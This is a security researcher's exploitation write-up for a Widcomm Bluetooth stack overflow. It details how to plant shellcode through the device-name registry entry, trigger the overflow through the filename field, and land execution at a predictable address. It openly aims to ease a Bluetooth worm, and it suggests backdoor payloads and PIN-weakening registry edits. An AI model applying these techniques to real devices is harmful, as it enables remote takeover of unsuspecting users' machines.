have you ever been BluePIMped? 

Exploiting The Widcomm BTStackServer by KF (kf_lists[at]digitalmunition[dot]com)
  
On August 12, 2004 Ryan Naraine of internetnews.com described a serious vulnerability in 
Widcomm's widely deployed Bluetooth Connectivity Software. It was said that this new threat 
could pave the way for the creation of a wireless worm that spreads between PCs or PDAs 
using Bluetooth. (Queue scary music in the background). It is now over a year later and I 
have yet to even see signs of an exploit, let alone a worm for either the PC or PDA. 
<sarcasm> Consider this document as my donation of a small amount of tar to help pave the 
road to a Widcomm Bluetooth worm.</sarcasm>

First let me outline how the Widcomm Bluetooth Stack works. Upon logging in to the Windows 
desktop the binary BTTray.exe is launched via the '..\All Users\Start Menu\Programs\Startup' 
startup folder. BTTray is responsible for two major tasks, one being the presentation of the 
Bluetooth icon in the systray and the other being the launch of BTStackServer.exe. BTTray.exe 
also handles events such as informing the user that someone has connected to a particular 
Bluetooth service. 

Several profiles are offered by the 'Local Services' menu within the BTTray Bluetooth 
Configuration screen. Several of the services require pairing prior to use, however by default 
no secure connection is required for the PIM Item Transfer. The lack of PIM Transfer security 
is likely due to this profile being commonly used to exchange business cards. The lack of a 
secure connection will pretty much allow any Bluetooth user to connect to the PIM Item 
Transfer service. 

Although not explicitly disclosed one of the various malformed service requests that Pentest 
Limited discovered was directed at the PIM Item Transfer service. As mentioned in their 
advisory Pentest Limited has written a proof of concept exploit for Windows XP and again 
although not explicitly disclosed this exploit was for the PIM Item Transfer service. After 
many months of frustration and hurdles I have come up with a fairly stable means of blindly
recreating the work of Pentest Limited.

My early work on this project attempted to use a single Unicode encoded buffer to both trigger 
this exploit and carry its payload. This technique was completely abandonded after an off the 
cup comment about client side Unicode made me come to my senses. One little call to 
OBEX_CharToUnicode() can change the playing field quite a bit. 

The mechanics of my current exploit are as follows: 
1. Use the ascii buffer used for Bluetooth device name to store shellcode. We have up to 248 
   bytes. 
2. Populate HKLM\SOFTWARE\Widcomm\BTConfig\Devices\XX:XX:XX:XX:XX:XX\Name on remote device with 
   shellcode
3. Make use of the remote filename field to trigger the overflow and to hold the repeated 
   return addresses
4. Deliver a payload of goodies for all to enjoy. 

The first phase of the exploit ensures that we have shellcode in memory at the time we activate 
the EIP address. This is done by sending a valid file via PIM Transfer. When a connection is made 
the registry is queried for the device name. If this name exists it will be used in the 
notification balloon that indicates a connection was made. If no registry entry is available 
<No Name> will be used and a query to resolve the name will be placed. 

This portion of the population phase can be recognised by the following message. 
Bluetooth device '<No Name>' is connected to the 'PIM Item Transfer' service on this computer. 

At this point as mentioned above a call has been made to resolve the Bluetooth name of the remote 
device that connected to the PIM Transer service. Once this call has been completed the name will 
be stored in the registry location shown below. Upon subsequent connections this entry will be 
displayed in the notification balloon. 

Below is an example of MsgBox shellcode from Skylined encoded via ShikataGaNai as it is stored in 
the registry after a name resolution. 

[HKEY_LOCAL_MACHINE\SOFTWARE\Widcomm\BTConfig\Devices\00:11:b1:07:be:a7]

  7a,9a,00

Next a secondary connection is made in order to actually trigger the overflow. This connection 
consists of our desired return address repeated over and over being cramed into the remote file 
name buffer. During the study of different exploitation attempts I found that my return address 
was not often alligned as I expected or in the location that I expected. I found that repeating it 
over and over helped stabilize my attempts. Deciding upon a static length for the filename also 
seemed to help keep things alligned properly. The initial 272 bytes I send as a repeated return 
address seems to be duplicated several times in succession in memory. The EIP seemes to be chosen 
semi randomly from the area below represented in the block of memory between 0x0053C9F7 and 
0x0053CCF7.

Please note that some of the bytes were corrupted above. In some cases 0x07 and 0xff randomly 
overwrote portions of our string. This would obviously corrupt any shellcode that was put into 
this buffer. After I stopped trying to cram shellcode here I found that on occasion this also 
caused undesired return addresses to be used rather than the one I specified. The letter "Z" is 
in some cases prepended to our buffer to help compensate for the corruption. 

Once the return address has been stabilized things should look similar to the following upon 
EIP activation. 

EAX 00000004
ECX 00008000
EDX 00000036
EBX 0038F6E8 ASCII "0"
ESP 01F7FF3C
EBP 01F7FF80
ESI 0038C510 ASCII "("
EDI 00000001
EIP 41424344

Our shellcode seems to be in several locations however only a few of them do not contain nulls. 
Across multiple versions and service packs the shellcode consistantly lands on an address with 
3 static bits 0x01??f74e. You can see this trend below in the targets section from my exploit. 
The shellcode location should contain the contents of the Bluetooth device name as it was stored 
in the registry. 

With a debugger attached to BTStackServer.exe we can attempt to activate the EIP and point it at 
our shellcode.

After the malformed request is sent my debugger paused with an Access violation when writing to 
[00713000]. You can safely pass this exception on to the program. This is a good time to verify 
that your shellcode is where you expect it to be.

Immediately after passing the exception control should be handed over to us. We should jump into 
the code we stored in the Bluetooth name buffer. Skylined's code will to do its magic and the real 
intent of our payload is revealed.

At this point the user of the machine should be greeted with a nice message box window titled 
"CATS:" with the message "ALL YOUR BLUETOOTH ARE BELONG TO US.". Obviously any payload can be 
plugged into the exploit keeping in mind space limitations of the various buffers. 

In an ideal situation the initial phase that places the shellcode in the registry should be 
used as an chance to upload a binary with some sort of backdoor functionality as well as a 
scripted procedure to kill BTTray and restart it. Any uploaded binary would reside in 
"%USERPROFILE%"\mydocu~1\blueto~1 by default so shellcode that can resolve that path and execute 
a binary there would be very useful (hint hint email me some shellcode if anyone is bored).

I have toyed around with payloads that flip a few bits in SOFTWARE\Widcomm\BTConfig\Services\\000?, 
SOFTWARE\Widcomm\General\UseFixedPIN and SOFTWARE\Widcomm\General\PinCode. However I have not yet 
come upon a payload that would be as functional as %USERPROFILE% execution code. 

I hope this document will help clear up some of the myths about the potential wormability of the 
Widcomm Bluetooth bugs. I also hope that Vendors that still distribute dongles with vulnerable 
software will step up to the plate and help eliminate this threat. Vendors...please put an end to 
the license.dat issues that prevent so many users from upgrading their Widcomm software.
